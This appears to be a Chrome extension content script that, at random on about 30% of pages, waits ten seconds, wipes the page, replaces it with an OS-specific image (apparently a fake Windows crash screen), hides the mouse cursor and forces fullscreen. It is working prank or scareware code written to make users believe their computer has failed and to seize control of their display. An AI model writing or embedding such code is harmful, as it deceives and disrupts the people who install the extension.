var OSVersion = "";
var chance = Math.floor(Math.random() * 100);

console.log('Num of chance: ' + chance);

if(chance >= 70) {

	//Validate SO Version
	if (window.navigator.userAgent.indexOf("Windows NT 10.0")!= -1) OSVersion="w8-w10.png"; //W10
	if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSVersion="w8-w10.png"; //W8
	if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSVersion="w7.png"; //W7
	if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSVersion="w7.png"; //"Windows Vista";
	if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSVersion="w7.png"; //"Windows XP";
	if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) OSVersion="w7.png"; //Windows 2000";
	if (window.navigator.userAgent.indexOf("Mac")            != -1) OSVersion="w7.png"; //"Mac/iOS";
	if (window.navigator.userAgent.indexOf("X11")            != -1) OSVersion="w7.png"; //"UNIX";
	if (window.navigator.userAgent.indexOf("Linux")          != -1) OSVersion="w7.png"; //"Linux";
	
	var url = chrome.extension.getURL("img/"+OSVersion);
	
	// Wait 10 seconds before death
	setTimeout(function(){		
		//Update CSS
		document.body.innerHTML = "";
		
		$('body').css('background-image', 'url("'+url+'")');
		$('body').css('background-repeat', 'no-repeat');
		$('body').css('background-size', 'cover');
		$('html').css('cursor', 'none');
		
		//Press Full Screen
		document.documentElement.requestFullscreen();
		
	}, 10000);

		
}